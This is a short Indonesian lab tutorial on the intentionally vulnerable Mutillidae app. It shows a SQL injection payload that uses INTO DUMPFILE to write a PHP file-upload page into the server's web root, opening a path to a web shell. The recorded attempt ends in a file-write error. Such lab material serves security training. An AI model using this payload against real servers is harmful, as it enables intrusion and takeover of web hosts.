# Mutillidae Lesson 11


### Membuka Halaman User Info

- Pada client, buka mutillidae dari browser
```
http://[ip_metasploit]/mutillidae
```
- Buka halaman User Info
```
OWASP TOP 10 -> A1 - SQL Injection -> SQLi Extract Data -> User Info
```
![](Mutillidae%20lesson%211/4.png)

### SQL Injection dengan Output File upload_file.php
- Pada halaman User Info, lakukan inspect element pada form Name dan ubah nilai size menjadi 100.
![](Mutillidae%20lesson%211/5.png)
- Dan pada tombol View Account Details ubah align menjadi left.
![](Mutillidae%20lesson%211/6.png)
- Isi form Name dengan string berikut
```
' union select null,null,null,null,'<html><body><div><?php if(isset($_FILES["fupload"])) { $source = $_FILES["fupload"]["tmp_name"]; $target = $_FILES["fupload"]["name"]; move_uploaded_file($source,$target); system("chmod 770 $target"); $size = getImageSize($target); } ?></div><form enctype="multipart/form-data" action="<?php print $_SERVER["PHP_SELF"]?>" method="post"><p><input type="hidden" name="MAX_FILE_SIZE" value="500000"><input type="file" name="fupload"><br><input type="submit" name="upload!"><br></form></body></html>' INTO DUMPFILE '/var/www/html/mutillidae/upload_file.php' -- 
```
- Klik View Account Details
![](Mutillidae%20lesson%2011/7.png)
- Hasil error tidak bisa menulis file.
![](Mutillidae%20lesson%2011/8.png)
